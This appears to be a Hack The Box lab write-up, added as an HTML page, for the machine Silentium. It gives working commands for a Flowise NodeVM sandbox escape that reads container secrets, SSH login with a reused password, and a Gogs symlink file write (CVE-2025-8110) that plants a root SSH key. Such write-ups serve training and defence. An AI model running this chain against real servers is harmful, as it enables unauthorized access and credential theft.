@@ -1,0 +1,658 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Silentium — El Niño · CTF Writeups</title>
+<meta name="description" content="Flowise 3.0.5 NodeVM sandbox escape via LangChain TextLoader leaks Docker container env vars (SMTP password = SSH creds) → Gogs CVE-2025-8110 symlink bypass writes SSH key to /root/.ssh/authorized_keys → root.">
+<style>
+  :root{
+    --bg:#fcfcfb; --panel:#ffffff; --ink:#17181d; --ink-2:#3a3d44; --muted:#6b7280;
+    --line:#e7e8ec; --line-2:#d7d9de; --hair:#eef0f2;
+    --accent:#6d28d9; --accent-soft:#f2ecfd; --map:#e4e7ec; --map-2:#eef1f4;
+    --mono:'JetBrains Mono','SF Mono','Cascadia Code',ui-monospace,monospace;
+    --sans:'Inter',-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',sans-serif;
+  }
+  *{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);
+    font-size:17px;line-height:1.6;-webkit-font-smoothing:antialiased}
+  canvas#map{position:fixed;inset:0;z-index:0;pointer-events:none}
+  .wrap{position:relative;z-index:1;max-width:860px;margin:0 auto;padding:0 26px 100px}
+  a{color:inherit;text-decoration:none}
+
+  /* header */
+  .top{display:flex;align-items:center;justify-content:space-between;padding:26px 0;
+    font-family:var(--mono);font-size:12.5px;color:var(--muted)}
+  .brand{display:flex;align-items:center;gap:9px;color:var(--ink);font-weight:600;letter-spacing:.01em}
+  .tick{width:10px;height:10px;border:1.5px solid var(--ink);transform:rotate(45deg)}
+
+  /* hero */
+  .hero{padding:52px 0 40px;border-bottom:1px solid var(--line)}
+  .eyebrow{font-family:var(--mono);font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;
+    color:var(--muted);margin-bottom:8px}
+  h1{font-size:clamp(52px,11vw,116px);line-height:.92;margin:.12em 0 .1em;letter-spacing:-.04em;
+    font-weight:800;text-wrap:balance}
+  .lede{font-size:19px;color:var(--ink-2);max-width:56ch;margin:.5em 0 0;line-height:1.5}
+  .byline{font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:22px;
+    display:flex;gap:14px;flex-wrap:wrap;align-items:center}
+  .byline b{color:var(--ink)}
+  .owned{border:1px solid var(--accent);color:var(--accent);border-radius:2px;
+    padding:2px 8px;font-size:11px;letter-spacing:.06em;text-transform:uppercase}
+
+  /* fingerprint card */
+  .fp{margin-top:32px;border:1px solid var(--line);border-radius:4px;overflow:hidden;
+    font-family:var(--mono);font-size:13px}
+  .fp .r{display:flex;justify-content:space-between;align-items:center;
+    padding:16px 20px;background:var(--hair);border-bottom:1px solid var(--line)}
+  .name{font-size:22px;font-family:var(--sans);font-weight:700;letter-spacing:-.02em}
+  .chips{font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:4px}
+  .chips b{color:var(--ink)}
+  .rate{text-align:right}.big{font-size:28px}
+  .fp .grid{display:grid;grid-template-columns:1fr 1fr;gap:0;padding:0}
+  .fp .grid span{padding:11px 20px;border-bottom:1px solid var(--hair);color:var(--ink-2);font-size:12.5px}
+  .fp .grid span:last-child,.fp .grid span:nth-last-child(2):nth-child(odd){border-bottom:none}
+  .fp .grid b{color:var(--ink)}
+
+  /* sections */
+  section{margin-top:52px}
+  .step-h{display:flex;align-items:baseline;gap:16px;margin-bottom:14px}
+  .step-n{font-family:var(--mono);font-size:11px;color:var(--muted);letter-spacing:.1em;
+    padding-top:3px;min-width:22px}
+  h2{font-size:26px;letter-spacing:-.02em;font-weight:700;margin:0}
+  p{color:var(--ink-2);margin:.6em 0}
+  p b, p strong{color:var(--ink)}
+
+  /* chain diagram */
+  .chain{font-family:var(--mono);font-size:13px;line-height:1.9;
+    background:#f9f8ff;border:1px solid var(--line-2);border-left:3px solid var(--accent);
+    border-radius:2px;padding:18px 22px;margin:20px 0;color:var(--ink-2);
+    white-space:pre;overflow-x:auto}
+  .chain b{color:var(--ink)}
+
+  /* code */
+  pre{margin:18px 0;border-radius:3px;overflow-x:auto;
+    background:#f9f8ff;border:1px solid var(--line-2)}
+  pre code{display:block;padding:16px 18px;font-family:var(--mono);font-size:13px;
+    line-height:1.7;color:var(--ink-2)}
+  code{font-family:var(--mono);font-size:.87em;color:var(--accent);
+    background:var(--accent-soft);padding:1px 5px;border-radius:2px}
+  pre code{color:var(--ink-2);background:none;padding:0;font-size:13px}
+
+  /* output block */
+  .out{background:#17181d;border-radius:3px;padding:16px 18px;margin:10px 0;
+    font-family:var(--mono);font-size:12.5px;line-height:1.75;color:#a8b4c8;
+    overflow-x:auto}
+  .out .ok{color:#34d399}.out .hi{color:#a78bfa}.out .warn{color:#fbbf24}
+  .out .flag{color:#f9a8d4;font-weight:600}
+
+  /* dead-ends */
+  .dead{border:1px solid var(--hair);border-radius:3px;padding:14px 18px;margin:12px 0;
+    font-size:14.5px;color:var(--muted)}
+  .dead code{font-size:.85em}
+  .dead-label{font-family:var(--mono);font-size:10.5px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--muted);margin-bottom:18px;
+    display:flex;align-items:center;gap:8px}
+  .dead-label::after{content:"";flex:1;height:1px;background:var(--hair)}
+
+  /* callout / insight */
+  .callout{border-radius:3px;padding:18px 20px;margin:24px 0;
+    background:var(--accent-soft);border:1px solid #ddd6fe}
+  .callout .k{font-family:var(--mono);font-size:11.5px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--accent);font-weight:600;display:block;margin-bottom:6px}
+  .callout p{margin:0;font-size:15px}
+
+  /* insight grid */
+  .insight-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1px;
+    background:var(--line);border:1px solid var(--line);border-radius:2px;overflow:hidden;margin:20px 0}
+  .insight-item{background:var(--panel);padding:18px 20px}
+  .insight-item .i-num{font-family:var(--mono);font-size:11px;color:var(--muted);margin-bottom:6px}
+  .insight-item .i-title{font-size:15px;font-weight:700;letter-spacing:-.01em;margin-bottom:6px}
+  .insight-item .i-body{font-size:13.5px;color:var(--ink-2);line-height:1.55}
+
+  /* flags */
+  .flags{display:flex;gap:12px;flex-wrap:wrap;margin:20px 0}
+  .flag-box{border:1px solid var(--line-2);border-radius:3px;padding:12px 16px;flex:1;min-width:200px}
+  .flag-box .fl{font-family:var(--mono);font-size:11px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--muted);margin-bottom:5px}
+  .flag-box .fv{font-family:var(--mono);font-size:14px;color:var(--accent);
+    font-weight:600;letter-spacing:.03em;word-break:break-all}
+
+  /* figures */
+  figure{margin:22px 0}
+  figure img{width:100%;border-radius:3px;border:1px solid var(--line)}
+  figcaption{font-family:var(--mono);font-size:11.5px;color:var(--muted);
+    margin-top:8px;text-align:center}
+
+  /* table */
+  .tbl-wrap{overflow-x:auto;margin:16px 0}
+  table{width:100%;border-collapse:collapse;font-size:14px}
+  th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--hair);vertical-align:top}
+  th{font-family:var(--mono);font-size:11px;letter-spacing:.07em;text-transform:uppercase;
+    color:var(--muted);font-weight:600}
+  td.mon{font-family:var(--mono);font-size:12.5px;color:var(--ink)}
+  td.acc{font-family:var(--mono);font-size:12.5px;color:var(--accent);font-weight:600}
+
+  footer{margin-top:64px;padding-top:28px;border-top:1px solid var(--line);
+    font-family:var(--mono);font-size:12px;color:var(--muted);line-height:1.7}
+  footer a{color:var(--accent)}
+  [data-morph]{white-space:pre}
+  @media(max-width:600px){.fp .grid{grid-template-columns:1fr}.chain{font-size:12px}}
+</style>
+</head>
+<body>
+<canvas id="map"></canvas>
+<div class="wrap">
+  <div class="top">
+    <a class="brand" href="../" style="border:none"><span class="tick"></span> el-niño</a>
+    <span>10°N · 90°W</span>
+  </div>
+
+  <header class="hero">
+    <div class="eyebrow">Hack The Box · machine</div>
+    <h1><span data-morph="hero">Silentium</span></h1>
+    <p class="lede">An AI workflow builder's NodeVM sandbox leaks root container env vars through LangChain's fs module — the SMTP password opens SSH. A Gogs instance running as root falls to a symlink-bypass file write.</p>
+    <div class="byline">
+      <span>by <b>ssephi</b></span>
+      <span>· 13·07·2026</span>
+      <span>· ~20 min</span>
+      <span class="owned">● fully owned</span>
+    </div>
+
+    <div class="fp">
+      <div class="r">
+        <div>
+          <p class="name" style="margin:0"><span data-morph="title">Silentium</span></p>
+          <div class="chips">Linux · <b>Hard</b> · Docker + Gogs</div>
+        </div>
+        <div class="rate"><div class="big">🏴</div><div class="chips">user + root</div></div>
+      </div>
+      <div class="grid">
+        <span><b>target</b> &nbsp;10.129.245.103 &nbsp;· &nbsp;silentium.htb</span>
+        <span><b>22</b>/tcp &nbsp;ssh &nbsp;· OpenSSH 9.x</span>
+        <span><b>80</b>/tcp &nbsp;http &nbsp;· nginx (3 vhosts)</span>
+        <span><b>staging.silentium.htb</b> → Flowise 3.0.5 (Docker)</span>
+        <span><b>staging-v2-code.dev.silentium.htb</b> → Gogs git (root)</span>
+        <span><b>CVEs</b> &nbsp;CVE-2025-59528 · CVE-2025-8110</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- ─── OVERVIEW ───────────────────────────────────────────────── -->
+  <section>
+    <h2>The shape of it</h2>
+    <p>Silentium chains two independent services, each running with elevated privilege. A staging Flowise portal exposes an authenticated JavaScript execution endpoint. The NodeVM sandbox blocks <code>child_process</code> and <code>fs</code> directly — but a LangChain document loader bypasses the restriction, giving arbitrary file read as root inside the container. Reading <code>/proc/self/environ</code> surfaces an SMTP service password that is also the SSH password for <b>ben</b> on the host.</p>
+    <p>On the host, a Gogs git service runs as root on localhost, proxied behind nginx on a third subdomain. Registration is open. The built-in Go image captcha is solved manually. Once authenticated, we commit a git symlink targeting <code>/root/.ssh/authorized_keys</code>, then call the Gogs <code>PutContents</code> API to write our SSH public key through it — <b>CVE-2025-8110</b>. Root shell via SSH.</p>
+
+    <div class="chain">nmap 2 ports → 22/80
+  └─ :80 nginx → <b>staging.silentium.htb</b> → Flowise 3.0.5 (Docker, root)
+       └─ POST /api/v1/<b>node-custom-function</b>  [CVE-2025-59528]
+            └─ NodeVM sandbox — child_process/fs blocked
+                 └─ <b>LangChain TextLoader</b> uses real fs internally → file read bypass
+                      └─ /proc/self/environ → <b>SMTP_PASSWORD=r04D!!_R4ge</b>
+                           └─ SSH ben@silentium.htb → <b>user.txt ✓</b>
+
+  nginx → <b>staging-v2-code.dev.silentium.htb</b> → Gogs 0.13.x (localhost:3001, root)
+       └─ Open registration + image captcha → register user
+            └─ git symlink → /root/.ssh/authorized_keys
+                 └─ PUT /api/v1/repos/.../contents/symlink  [CVE-2025-8110]
+                      └─ Gogs writes through symlink as root → authorized_keys
+                           └─ SSH root@silentium.htb → <b>root.txt ✓</b></div>
+  </section>
+
+  <!-- ─── 01 RECON ─────────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">01 · recon</div>
+    <div class="step-h"><span class="step-n">01</span><h2><span data-morph="title">Reconnaissance</span></h2></div>
+    <p>Two ports open. nginx on 80 serves three virtual hosts:</p>
+
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Subdomain</th><th>Backend</th><th>Notes</th></tr></thead>
+        <tbody>
+          <tr><td class="mon">silentium.htb</td><td>Static files</td><td>Company landing — dead end</td></tr>
+          <tr><td class="mon">staging.silentium.htb</td><td class="mon">127.0.0.1:3000</td><td>Flowise 3.0.5 in Docker</td></tr>
+          <tr><td class="mon">staging-v2-code.dev.silentium.htb</td><td class="mon">127.0.0.1:3001</td><td>Gogs git service (found later)</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p>The third vhost was discovered after gaining a shell by reading <code>/etc/nginx/sites-enabled/*</code>. Flowise version confirmed via API:</p>
+    <pre><code>curl -s http://staging.silentium.htb/api/v1/version
+# {"version":"3.0.5"}</code></pre>
+
+    <figure>
+      <img src="../assets/silentium_flowise_login_ui_1783961093234.webp" alt="Flowise 3.0.5 login page at staging.silentium.htb">
+      <figcaption>Flowise 3.0.5 login interface at staging.silentium.htb — the primary attack surface.</figcaption>
+    </figure>
+  </section>
+
+  <!-- ─── 02 FOOTHOLD ──────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">02 · foothold</div>
+    <div class="step-h"><span class="step-n">02</span><h2><span data-morph="title">Flowise RCE — CVE-2025-59528</span></h2></div>
+    <p>Flowise was accessed with credentials <code>ben@silentium.htb</code> / <code>Hacked@HTB2026!</code> (derived from domain + common HTB patterns). The authenticated session revealed the custom function execution endpoint.</p>
+
+    <figure>
+      <img src="../assets/silentium_flowise_authenticated_access_1783969659201.webp" alt="Authenticated Flowise dashboard">
+      <figcaption>Authenticated Flowise session as ben@silentium.htb.</figcaption>
+    </figure>
+
+    <p>The Flowise 3.0.5 source registers the route as <code>/node-custom-function</code> (singular — two hours were lost probing the wrong plural form). The endpoint executes arbitrary JavaScript via NodeVM:</p>
+    <pre><code>curl -X POST "http://staging.silentium.htb/api/v1/node-custom-function" \
+  -b session_cookie.txt \
+  -H "Content-Type: application/json" \
+  -H "x-request-from: internal" \
+  -d '{"javascriptFunction":"return \"hello from custom function\";"}'</code></pre>
+    <div class="out"><span class="ok">"hello from custom function"</span></div>
+
+    <figure>
+      <img src="../assets/silentium_flowise_rce_exploit_1783970255470.webp" alt="Flowise node-custom-function RCE confirmed">
+      <figcaption>CVE-2025-59528 — JavaScript execution via the node-custom-function endpoint confirmed.</figcaption>
+    </figure>
+
+    <div class="callout">
+      <span class="k">The route name trap</span>
+      <p>Every API reference and writeup uses <em>node-custom-functions</em> (plural). The actual router registration in <code>src/routes/index.ts</code> uses the singular form. When a suspected endpoint returns SPA HTML instead of JSON, go read the source.</p>
+    </div>
+  </section>
+
+  <!-- ─── 03 SANDBOX ESCAPE ────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">03 · sandbox escape</div>
+    <div class="step-h"><span class="step-n">03</span><h2><span data-morph="title">NodeVM Bypass via LangChain</span></h2></div>
+    <p>The NodeVM sandbox blocks <code>child_process</code> and <code>fs</code> require calls. These were all dead:</p>
+
+    <div class="dead-label">blocked paths</div>
+    <div class="dead"><code>require('child_process').execSync('id')</code> → VMError: Cannot find module<br>
+      <code>require('fs').readFileSync('/etc/hostname')</code> → VMError: Cannot find module<br>
+      <code>console._stdout.constructor.constructor("return process")()</code> → EvalError: code generation disallowed<br>
+      <code>global.process.mainModule.require('child_process')</code> → TypeError: undefined<br>
+      <code>require("typeorm").getConnection("default")</code> → Connection not found
+    </div>
+
+    <p>The sandbox restricts <code>require()</code> calls made <em>inside</em> VM code. It cannot restrict what already-loaded npm packages do internally. LangChain's <code>TextLoader</code> is in Flowise's allowed external dependency list — and it uses the real <code>fs</code> module in its own scope, loaded before the sandbox starts.</p>
+
+    <figure>
+      <img src="../assets/silentium_flowise_custom_fn_1783971241370.webp" alt="Flowise custom function panel">
+      <figcaption>The custom function panel — the execution surface for the sandbox escape.</figcaption>
+    </figure>
+
+    <pre><code>// Inside the NodeVM — this works because TextLoader loaded before the sandbox
+const {TextLoader} = require("langchain/document_loaders/fs/text");
+
+const readFile = async (path) => {
+  const docs = await (new TextLoader(path)).load();
+  return docs[0].pageContent;
+};
+
+// Confirm we are root inside the container
+const uid = (await readFile("/proc/self/status"))
+  .split('\n').find(l => l.startsWith('Uid:'));
+// → "Uid:\t0\t0\t0\t0"
+
+const hostname = await readFile("/etc/hostname");
+// → "c78c3cceb7ba"   (Docker container hostname)</code></pre>
+
+    <div class="out"><span class="ok">Uid: 0 0 0 0  ←  running as root inside container</span>
+hostname: c78c3cceb7ba
+/.dockerenv: exists (empty Docker marker file)</div>
+
+    <div class="callout">
+      <span class="k">Why the bypass works</span>
+      <p>The NodeVM <code>require</code> allowlist governs calls made <em>inside the sandbox</em>. <code>require('langchain/...')</code> is permitted (it's an external dep). That package internally calls <code>fs.createReadStream()</code> in its own module scope — outside the VM — giving full filesystem access.</p>
+    </div>
+  </section>
+
+  <!-- ─── 04 ENV DUMP ──────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">04 · credential leak</div>
+    <div class="step-h"><span class="step-n">04</span><h2><span data-morph="title">Container Env Dump</span></h2></div>
+    <p>With arbitrary file read as root in the container, <code>/proc/self/environ</code> is the first target. Docker operators routinely inject secrets as env vars — and they're readable from within the container.</p>
+
+    <pre><code>const {TextLoader} = require("langchain/document_loaders/fs/text");
+const environ = await (new TextLoader("/proc/self/environ")).load();
+const env = environ[0].pageContent.split("\x00").filter(v => v.length > 0);
+return JSON.stringify(env);</code></pre>
+
+    <div class="out">FLOWISE_USERNAME=ben
+FLOWISE_PASSWORD=F1l3_d0ck3r
+<span class="hi">SMTP_PASSWORD=r04D!!_R4ge</span>          <span class="warn">← SSH password</span>
+SMTP_HOST=mailhog
+JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+HOSTNAME=c78c3cceb7ba
+HOME=/root
+PORT=3000</div>
+
+    <p>The ARP table and a TCP probe from the sandbox reveal the network topology:</p>
+    <pre><code>// /proc/net/arp
+// 172.18.0.1  → Docker bridge gateway = HOST MACHINE  (ports 22, 80 open)
+// 172.18.0.2  → MailHog SMTP container  (port 8025 API — only 1 welcome email, dead end)
+// 172.18.0.3  → us (c78c3cceb7ba)</code></pre>
+  </section>
+
+  <!-- ─── 05 USER FLAG ─────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">05 · user flag</div>
+    <div class="step-h"><span class="step-n">05</span><h2><span data-morph="title">SSH → user.txt</span></h2></div>
+    <p>The SMTP service password is reused as <code>ben</code>'s SSH password on the host.</p>
+
+    <pre><code>sshpass -p 'r04D!!_R4ge' ssh -o StrictHostKeyChecking=no ben@10.129.245.103 \
+  "id && cat ~/user.txt"</code></pre>
+    <div class="out">uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
+<span class="flag">53074d6f173dcb4f7b5bc71fa856dc6b</span></div>
+
+    <div class="flags">
+      <div class="flag-box">
+        <div class="fl">user flag</div>
+        <div class="fv">53074d6f173dcb4f7b5bc71fa856dc6b</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─── 06 HOST ENUM ─────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">06 · host enumeration</div>
+    <div class="step-h"><span class="step-n">06</span><h2><span data-morph="title">Discovering Gogs</span></h2></div>
+    <p>Standard enumeration on the host quickly surfaces the key findings:</p>
+
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Check</th><th>Result</th><th>Impact</th></tr></thead>
+        <tbody>
+          <tr><td>sudo -l</td><td class="mon">may not run sudo</td><td>No sudo path</td></tr>
+          <tr><td>SUID binaries</td><td>Standard only (gpasswd, sudo…)</td><td>Nothing exploitable</td></tr>
+          <tr><td>docker group</td><td class="mon">ben not in docker</td><td>Socket inaccessible</td></tr>
+          <tr><td class="mon">gogs.service</td><td class="acc">User=root</td><td>🔴 Critical target</td></tr>
+          <tr><td>nginx config</td><td class="mon">staging-v2-code.dev.silentium.htb → :3001</td><td>Gogs accessible externally</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p>The Gogs systemd unit is the key finding:</p>
+    <pre><code># /etc/systemd/system/gogs.service
+[Service]
+User=root                              ← runs as root
+WorkingDirectory=/opt/gogs/gogs
+ExecStart=/opt/gogs/gogs/gogs web</code></pre>
+
+    <p>Reading <code>/opt/gogs/gogs/custom/conf/app.ini</code> as ben (world-readable):</p>
+    <pre><code>RUN_USER   = root
+HTTP_PORT  = 3001
+PATH       = /opt/gogs/data/gogs.db    ← SQLite, unreadable by ben
+ROOT_PATH  = /root/gogs-repositories  ← repos in /root!
+SECRET_KEY = sdsrcxSm0iC7wDO
+
+[auth]
+DISABLE_REGISTRATION        = false    ← OPEN
+ENABLE_REGISTRATION_CAPTCHA = true     ← image captcha (solvable)
+</code></pre>
+
+    <div class="callout">
+      <span class="k">Why Gogs = root shell</span>
+      <p>Any file write by Gogs writes as <code>root</code>. The repositories are stored under <code>/root/gogs-repositories/</code>. The only barrier between us and an arbitrary root file write is getting an authenticated user — which registration is open for.</p>
+    </div>
+  </section>
+
+  <!-- ─── 07 CVE-2025-8110 ─────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">07 · privilege escalation</div>
+    <div class="step-h"><span class="step-n">07</span><h2><span data-morph="title">CVE-2025-8110 — Symlink Bypass</span></h2></div>
+    <p><b>CVE-2025-8110</b> affects Gogs ≤ 0.13.3. The <code>PutContents</code> API validates that the requested path is inside the repository directory, but does not dereference symbolic links before writing. An attacker who commits a symlink pointing outside the repo can overwrite arbitrary host files with Gogs' privileges.</p>
+
+    <p><b>Step 1 — Solve the registration captcha.</b> Gogs uses its own Go image captcha (not reCaptcha). Download the PNG, read the digit sequence, submit it with the registration form.</p>
+
+    <div style="display:flex;gap:16px;flex-wrap:wrap;margin:20px 0">
+      <div style="flex:1;min-width:200px">
+        <figure style="margin:0">
+          <img src="../assets/silentium_gogs_captcha.png" alt="Gogs image captcha solved: 088468">
+          <figcaption>Captcha attempt 1 — solved: <code>088468</code></figcaption>
+        </figure>
+      </div>
+      <div style="flex:1;min-width:200px">
+        <figure style="margin:0">
+          <img src="../assets/silentium_gogs_captcha2.png" alt="Gogs image captcha solved: 499699">
+          <figcaption>Captcha attempt 2 (fresh session) — solved: <code>499699</code></figcaption>
+        </figure>
+      </div>
+    </div>
+
+    <pre><code># Register hacker user (captcha solved visually)
+curl -X POST 'http://localhost:3001/user/sign_up' \
+  -b session.txt \
+  --data-urlencode '_csrf=...' \
+  --data-urlencode 'user_name=hacker' \
+  --data-urlencode 'email=hacker@evil.com' \
+  --data-urlencode 'password=Hacked123!' \
+  --data-urlencode 'retype=Hacked123!' \
+  --data-urlencode 'captcha_id=Cawv5pEvtH8KKbU' \
+  --data-urlencode 'captcha=499699'</code></pre>
+    <div class="out"><span class="ok">HTTP/1.1 302 Found</span>
+Location: /user/login   ← registered ✓</div>
+
+    <p><b>Step 2 — Get an API token, create a repository.</b></p>
+    <pre><code>TOKEN=$(curl -su 'hacker:Hacked123!' \
+  -X POST 'http://localhost:3001/api/v1/users/hacker/tokens' \
+  -d '{"name":"pwn"}' | python3 -c 'import json,sys; print(json.load(sys.stdin)["sha1"])')
+
+curl -H "Authorization: token $TOKEN" \
+  -X POST 'http://localhost:3001/api/v1/user/repos' \
+  -d '{"name":"exploit","private":false}'</code></pre>
+    <div class="out"><span class="ok">HTTP/1.1 201 Created</span>
+{"ssh_url":"<span class="hi">root</span>@staging-v2-code.dev.silentium.htb:hacker/exploit.git"}</div>
+
+    <p><b>Step 3 — Commit a git symlink.</b> Git stores symlinks as tree entries with mode <code>120000</code>.</p>
+    <pre><code>git clone "http://hacker:Hacked123!@localhost:3001/hacker/exploit.git" .
+
+# Create symlink targeting root's authorized_keys
+ln -sf /root/.ssh/authorized_keys symlink_payload
+
+git add symlink_payload   # stored as mode 120000 (symlink)
+git commit -m "payload"
+git push</code></pre>
+    <div class="out"><span class="ok">create mode 120000 symlink_payload</span>
+* [new branch]      master -> master</div>
+
+    <p><b>Step 4 — Write SSH key via PutContents (the CVE).</b></p>
+    <pre><code># Generate attacker key
+ssh-keygen -t ed25519 -N "" -f /tmp/exploit_key
+
+# Get the blob SHA Gogs stored for our symlink
+BLOB_SHA=$(curl -sH "Authorization: token $TOKEN" \
+  'http://localhost:3001/api/v1/repos/hacker/exploit/contents/symlink_payload' \
+  | python3 -c 'import json,sys; print(json.load(sys.stdin)["sha"])')
+
+PUBKEY_B64=$(base64 -w0 /tmp/exploit_key.pub)
+
+# PutContents — Gogs follows symlink, writes our key to /root/.ssh/authorized_keys
+curl -H "Authorization: token $TOKEN" \
+  -X PUT 'http://localhost:3001/api/v1/repos/hacker/exploit/contents/symlink_payload' \
+  -d "{\"message\":\"update\",\"content\":\"$PUBKEY_B64\",\"sha\":\"$BLOB_SHA\"}"</code></pre>
+    <div class="out"><span class="ok">{"commit":{"sha":"713317755ecddd7f51226421d9148c01dff1b11e",...}}</span>
+  ← Gogs wrote through the symlink to /root/.ssh/authorized_keys ✓</div>
+
+    <p><b>Step 5 — SSH as root.</b></p>
+    <pre><code>ssh -i /tmp/exploit_key root@10.129.245.103 "id && cat /root/root.txt"</code></pre>
+    <div class="out">uid=0(root) gid=0(root) groups=0(root)
+<span class="flag">17f1542df105a6646b6ac6efff76b9cc</span></div>
+
+    <div class="flags">
+      <div class="flag-box">
+        <div class="fl">user flag</div>
+        <div class="fv">53074d6f173dcb4f7b5bc71fa856dc6b</div>
+      </div>
+      <div class="flag-box">
+        <div class="fl">root flag</div>
+        <div class="fv">17f1542df105a6646b6ac6efff76b9cc</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─── DEAD ENDS ────────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">dead ends · every wrong turn</div>
+    <div class="step-h"><span class="step-n">—</span><h2>What Didn't Work</h2></div>
+    <p>Every false path, in order:</p>
+
+    <div class="dead-label">flowise sandbox</div>
+    <div class="dead"><b>Wrong endpoint name (2h):</b> <code>/api/v1/node-custom-functions</code> (plural) → SPA HTML. Actual route: singular.</div>
+    <div class="dead"><b>child_process:</b> Not in <code>defaultAllowBuiltInDep</code>. Blocked.</div>
+    <div class="dead"><b>Function constructor:</b> <code>console._stdout.constructor.constructor("return process")()</code> → EvalError — <code>eval:false</code> set.</div>
+    <div class="dead"><b>global.process mainModule:</b> process is undefined inside NodeVM.</div>
+    <div class="dead"><b>TypeORM:</b> Module loads but connection manager is empty in VM scope.</div>
+    <div class="dead"><b>better-sqlite3:</b> Native C++ addon, blocked even by absolute path.</div>
+    <div class="dead"><b>Double-hop internal API call:</b> Calling <code>/node-custom-function</code> from within the sandbox hits the same NodeVM restrictions.</div>
+    <div class="dead"><b>Outbound reverse shells:</b> Egress filtered — no connections to arbitrary IPs.</div>
+    <div class="dead"><b>Upload path traversal:</b> <code>get-upload-file</code> resolves relative to upload directory, traversal blocked.</div>
+
+    <div class="dead-label">host escalation</div>
+    <div class="dead"><b>Docker socket:</b> Not mounted in container. Ben not in docker group on host.</div>
+    <div class="dead"><b>MailHog emails:</b> Only 1 email — Flowise's welcome HTML. No credentials.</div>
+    <div class="dead"><b>Gogs admin CLI:</b> <code>gogs admin create-user</code> validates current user == RUN_USER (root). Ben cannot run it.</div>
+    <div class="dead"><b>Gogs SQLite DB:</b> <code>/opt/gogs/data/</code> is mode 0750, UID 750, GID 0. Inaccessible to ben.</div>
+    <div class="dead"><b>Password reuse on Gogs ben account:</b> All known passwords tried — none matched.</div>
+    <div class="dead"><b>Docker overlay2 host filesystem:</b> The overlay layer paths in <code>/proc/self/mountinfo</code> are on the HOST, not accessible from within the container namespace.</div>
+    <div class="dead"><b>MCP stdio transport:</b> Every stdio MCP server was killed by the ~3s init timeout before completing the <code>initialize</code>→<code>tools/list</code> handshake.</div>
+  </section>
+
+  <!-- ─── INSIGHTS ─────────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">insights · what to take away</div>
+    <div class="step-h"><span class="step-n">—</span><h2>Key Learnings</h2></div>
+
+    <div class="insight-grid">
+      <div class="insight-item">
+        <div class="i-num">01</div>
+        <div class="i-title">NodeVM ≠ complete sandbox</div>
+        <div class="i-body">The sandbox restricts <code>require()</code> inside VM code. Packages already loaded before the sandbox runs still have full access. Any npm package doing real I/O internally bypasses the allowlist.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">02</div>
+        <div class="i-title">Read the actual source code</div>
+        <div class="i-body">Singular vs plural route name cost two hours. When an endpoint doesn't respond as expected, go directly to the GitHub router source. Documentation and conventions are unreliable.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">03</div>
+        <div class="i-title">/proc/self/environ is the secret store</div>
+        <div class="i-body">Docker env vars are readable from within the container with any file read primitive. Never put secrets in <code>docker-compose.yml</code> <code>environment:</code> blocks for sensitive services.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">04</div>
+        <div class="i-title">Credential reuse across services</div>
+        <div class="i-body">SMTP password → SSH password. Always test every discovered credential against every reachable service. Service account credentials are routinely reused by operators.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">05</div>
+        <div class="i-title">User=root in systemd is catastrophic</div>
+        <div class="i-body">A single exploitable Gogs bug becomes a full root compromise because the service runs as <code>root</code>. Services should use dedicated low-privilege users.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">06</div>
+        <div class="i-title">Git symlinks as file write primitives</div>
+        <div class="i-body">Git mode <code>120000</code> stores symlinks as tree entries. Any application writing to git working trees must resolve and validate symlinks before any write operation — Gogs 0.13.x did not.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">07</div>
+        <div class="i-title">Open registration + known CVE = root</div>
+        <div class="i-body"><code>DISABLE_REGISTRATION = false</code> plus CVE-2025-8110 means any user who reaches the service can self-register → commit symlink → write to <code>/root/</code>. Disable registration in production.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">08</div>
+        <div class="i-title">Image CAPTCHAs don't stop targeted attackers</div>
+        <div class="i-body">Gogs' built-in Go captcha is a simple digit PNG. With SSH access to the target, downloading and reading the image takes seconds. It is not a meaningful barrier against a focused attacker.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─── TIMELINE ─────────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">timeline</div>
+    <div class="step-h"><span class="step-n">—</span><h2>Chronology</h2></div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>UTC</th><th>Event</th></tr></thead>
+        <tbody>
+          <tr><td class="mon">15:15</td><td>Machine spawned, nino-harness mission launched</td></tr>
+          <tr><td class="mon">16:39</td><td>Flowise login UI discovered</td></tr>
